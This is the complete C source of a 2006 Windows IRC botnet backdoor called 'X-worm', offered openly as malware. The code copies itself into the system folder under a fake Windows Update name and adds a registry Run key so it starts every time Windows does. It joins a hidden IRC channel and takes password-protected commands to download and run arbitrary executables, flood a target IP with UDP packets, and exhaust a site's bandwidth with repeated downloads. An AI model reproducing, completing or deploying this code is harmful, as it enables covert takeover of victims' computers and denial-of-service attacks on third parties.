
/*
X-worm Backdoor (c) 2006 by DR-EF
---------------------------------

thats is a basic irc bot that support that commands:

a)udp flooding
b)download&exe
c)http DoS

*/

#include "stdafx.h"
#include "winsock2.h"
#include "stdlib.h"
#include "stdio.h"
#include "wininet.h"

const char copyright[]="X-worm Backdoor (c) 2006 by DR-EF";

const char TaskName[]="WihdowsUpdate";				//startup app name
const char InstalledFile[]="\\WindowsUpdt.exe";		//backdoor file name

const char IrcServer[]="irc.undernet.org";			//irc server
const int  ServerPort=6667;							//port
const char Password[]="avers-sucks!";				//login password

const char Channel[]="#xw0rmz";						//botnet channel
const char Channel_Password[]="x-worm_by_DR-EF";	//channel password


BOOL Backdoor_Unlocked=FALSE;

char NickName[]="xxxxxxxxx";
char UserName[]="xxxxxxxx";
char RealName[]="xxxxxx";

char buffer[8192];			//8k buffer

char buffer2[64];

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"wininet.lib")

//download file struct

typedef struct DownloadInfo
{
	char URL_To_Download[512];
	char Save_To_Path[512];
	BOOL Execute_Downloaded_File;
}DownLoad_Info,*lpDownload_Info;

typedef struct BandWidthdDoS_Inf
{
	char url[250];
	int  xloop;
	int	pause;
}BWD_INFO;

typedef struct UdpFlood
{
	char ip_address[20];
	int pocket_size;
	int port;
}UDP_FLOOD;

SOCKET Irc_Socket;			//socket for irc



void download_file(char file_url[],char save_path[])
{
	/*
	download file from web site
	*/
	HINTERNET hinternet,hurl;
	HANDLE hfile;
	DWORD readed_bytes=0,writed_bytes;
	char bbuffer;
	hinternet=InternetOpen("",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,NULL);
	if(hinternet!=NULL)
	{
		hurl=InternetOpenUrl(hinternet,file_url,NULL,NULL,INTERNET_FLAG_RELOAD,NULL);
		if(hurl!=NULL)
		{
			hfile=CreateFile(save_path,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
			if(hfile!=NULL)
			{
				while(InternetReadFile(hurl,&bbuffer,1,&readed_bytes)==TRUE && readed_bytes!=0)
					WriteFile(hfile,&bbuffer,1,&writed_bytes,NULL);
				CloseHandle(hfile);
			}
			InternetCloseHandle(hurl);
		}
		InternetCloseHandle(hinternet);
	}
}


int myrecv()
{
	memset(buffer,0,sizeof(buffer));					//zero array buffer
	return(recv(Irc_Socket,buffer,sizeof(buffer),0));	//recv & return
}

DWORD WINAPI udp_flood(LPVOID Xudp_Flood)
{
	WSADATA wsd;
	SOCKET xsocket;
	sockaddr_in sin;
	int none_blocking=0;
	HGLOBAL xpocket;
	int xport=0;

	UDP_FLOOD xflood;

	memcpy(&xflood,Xudp_Flood,sizeof(UDP_FLOOD));

	if(WSAStartup(MAKEWORD(1,1),&wsd)==0)
	{
		xsocket=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
		if(xsocket!=INVALID_SOCKET)
		{
			ioctlsocket(xsocket,FIONBIO,(u_long FAR*)&none_blocking);	//turn off blocking sockets

			sin.sin_port=htons(xflood.port);
			sin.sin_addr.s_addr=inet_addr(xflood.ip_address);
			sin.sin_family=AF_INET;

			xpocket=GlobalAlloc(GPTR,xflood.pocket_size);

			if(xpocket!=NULL)
			{
				srand(GetTickCount());

				for(;;)
				{
					if(xport>10)	//change port every 11 times
					{
						sin.sin_port=htons((rand() % 1500));
						xport=0;
					}
					xport++;
					sendto(xsocket,(const char *)xpocket,xflood.pocket_size,0,(SOCKADDR *)&sin,sizeof(sin));
					Sleep(1500);
				}

			}
			closesocket(xsocket);
		}
		WSACleanup();
	}
	return 1;
}


DWORD WINAPI Waste_Bandwidth(LPVOID BW_Dddos)
{
	BWD_INFO BW_Inf;

	char TempFile[MAX_PATH];

	memcpy(&BW_Inf,BW_Dddos,sizeof(BWD_INFO));

	GetTempPath(MAX_PATH,TempFile);

	lstrcat(TempFile,"url1.dat");

	for(int i=0;i<BW_Inf.xloop;i++)
	{
		download_file(BW_Inf.url,TempFile);
		Sleep(BW_Inf.pause);
		DeleteFile(TempFile);
	}
	return 1;
}


int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	int i=0,randn=0,retval=0;
	WSADATA	wsd1;
	char *p1;
	LPHOSTENT hostnt1;
	sockaddr_in sin1;
	char cmd1[128],cmd2[128],cmd3[128],cmd4[128];
	HANDLE hbandwidth,hudp;
	DWORD Thread_Id;
	BWD_INFO bandwidth;
	UDP_FLOOD xflood;
	char Installed[MAX_PATH];
	char thisfile[MAX_PATH];
	DWORD tfsize=sizeof(Installed);
	HKEY	hkey;

	GetModuleFileName(NULL,thisfile,MAX_PATH);

	GetSystemDirectory(Installed,MAX_PATH);
	lstrcat(Installed,InstalledFile);

	CopyFile(thisfile,Installed,FALSE);

	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,KEY_WRITE,&hkey)==ERROR_SUCCESS)
	{
		RegSetValueEx(hkey,TaskName,0,REG_SZ,(const unsigned char *)Installed,tfsize);
		RegCloseKey(hkey);
	}

	while(true)
	{
		srand(GetTickCount());										//init random number generator

		for(i=0,randn=0;i<lstrlen(NickName);i++,randn=(rand() % 90))			//create random nick name
			if (randn<30)
				NickName[i]=(65 + (rand() % 25));
			else
				NickName[i]=(97 + (rand() % 25));

		for(i=0,randn=0;i<lstrlen(UserName);i++,randn=(rand() % 90))			//create random user name
				UserName[i]=(97 + (rand() % 25));

		for(i=0,randn=0;i<lstrlen(RealName);i++,randn=(rand() % 90))				//create random ident
			if (randn<45)
				RealName[i]=(65 + (rand() % 25));
			else
				RealName[i]=(97 + (rand() % 25));


		if(WSAStartup(MAKEWORD(1,1),&wsd1)==0)										//start up winsock
		{
			Irc_Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);						//create socket
			if(Irc_Socket!=INVALID_SOCKET)
			{
				hostnt1=gethostbyname(IrcServer);
				if(hostnt1!=NULL)
				{
					sin1.sin_family=AF_INET;
					sin1.sin_port=htons(ServerPort);
					sin1.sin_addr=*((LPIN_ADDR)*hostnt1->h_addr_list);
					if(connect(Irc_Socket,(LPSOCKADDR)&sin1,sizeof(struct sockaddr))!=SOCKET_ERROR)
					{

						//join secreat channel
						//--------------------

						Sleep(3000);												//sleep 2.2 second

						myrecv();

						wsprintf(buffer,"USER %s 8 * :%s\r\n",UserName,RealName);	//build USER command

						send(Irc_Socket,buffer,lstrlen(buffer),0);					//send USER command

						wsprintf(buffer,"NICK %s\r\n",NickName);					//build NICK command

						send(Irc_Socket,buffer,lstrlen(buffer),0);					//send NICK command

						myrecv();													//recive server message


						//answere the ping message

						p1=strstr(buffer,"PING :");

						if(p1!=NULL)												//if server return ping
						{															// message,it mean everything is ok
							p1+=6;													//move pointer to start of ping parameter
							i=0;
							do
							{
								buffer2[i]=*p1;
								i++;
								p1++;
							}while(*p1!=0xd);

							wsprintf(buffer,"PONG %s\r\n",buffer2);					//build PONG command

							send(Irc_Socket,buffer,lstrlen(buffer),0);				//send PONG command

							myrecv();												//recive message from server

							p1=buffer;												//p1=start of buffer

							do
							{
								p1++;
							}while(*p1!=0x20);

							p1++;
						}

						p1=strstr(buffer,"001");

						if(p1!=NULL)								//we got welcome message?
						{
							wsprintf(buffer,"JOIN %s %s\r\n",Channel,Channel_Password);				//join channel
							send(Irc_Socket,buffer,lstrlen(buffer),0);
							myrecv();

							wsprintf(buffer,"MODE %s +nsk %s\r\n",Channel,Channel_Password); //hide & protect it
							send(Irc_Socket,buffer,lstrlen(buffer),0);

							retval=myrecv();

							while(retval != 0 && retval != INVALID_SOCKET)
							{
								//main irc bot loop !
								//-------------------

									//check for ping message
								p1=buffer;

								if(strncmp(p1,"PING :",6)==0)
								{
									p1+=6;
									i=0;
									do
									{
										buffer2[i]=*p1;
										i++;
										p1++;
									}while(*p1!=0xd);

									wsprintf(buffer,"PONG %s\r\n",buffer2);					//build PONG command

									send(Irc_Socket,buffer,lstrlen(buffer),0);				//send PONG command

								}

									//split server message

								memset(cmd1,0,sizeof(cmd1));
								memset(cmd2,0,sizeof(cmd2));
								memset(cmd3,0,sizeof(cmd3));
								memset(cmd4,0,sizeof(cmd4));

								sscanf(buffer,"%*s %s %*s %s %s %s",cmd1,cmd2,cmd3,cmd4);

								for(i=0;i<lstrlen(cmd2);i++)		//remove the first char from cmd2
									cmd2[i]=cmd2[i+1];

								//check commands
								if(lstrcmp(cmd1,"PRIVMSG")==0)
								{
									if(lstrcmp(cmd2,"-!login")==0)
									{
										if(lstrcmp(cmd3,Password)==0)
										{
											wsprintf(buffer,"PRIVMSG %s :Login Success\r\n",
												Channel);
											send(Irc_Socket,buffer,lstrlen(buffer),0);
											Backdoor_Unlocked=TRUE;
										}
									}

									if(Backdoor_Unlocked==TRUE)
									{
										if(lstrcmp(cmd2,"-!download_exe")==0)
										{
											download_file(cmd3,"1.exe");
											if(WinExec("1.exe",1)>31)
											{
												wsprintf(buffer,
													"PRIVMSG %s :%s Downloaded&executed\r\n",
													Channel,cmd3);
												send(Irc_Socket,buffer,lstrlen(buffer),0);
											}
										}
										if(lstrcmp(cmd2,"-!udp_flood")==0)
										{
											lstrcpy(xflood.ip_address,cmd3);
											xflood.pocket_size=60000;
											xflood.port=80;

											hudp=CreateThread(NULL,NULL,
												udp_flood,&xflood,NULL,&Thread_Id);
											wsprintf(buffer,"PRIVMSG %s :Udp Floding %s\r\n",
												Channel,cmd3);
											send(Irc_Socket,buffer,lstrlen(buffer),0);
										}
										if(lstrcmp(cmd2,"-!waste_bandwidth")==0)
										{
											lstrcpy(bandwidth.url,cmd3);
											bandwidth.xloop=0xFFFF;
											bandwidth.pause=150;
											hbandwidth=CreateThread(NULL,NULL,
												Waste_Bandwidth,&bandwidth,NULL,&Thread_Id);
											wsprintf(buffer,"PRIVMSG %s :Wasting %s\r\n",
												Channel,cmd3);
											send(Irc_Socket,buffer,lstrlen(buffer),0);
										}
										if(lstrcmp(cmd2,"-!stop")==0)
										{
											TerminateThread(hbandwidth,1);
											TerminateThread(hudp,1);
											wsprintf(buffer,
												"PRIVMSG %s :Operations Stoped\r\n",Channel);
											send(Irc_Socket,buffer,lstrlen(buffer),0);			//send JOIN command
										}
									}
								}
								retval=myrecv();								//recive server message
							}
						}
					}
				}
				closesocket(Irc_Socket);
			}
			WSACleanup();
		}
	}
	return 0;
}



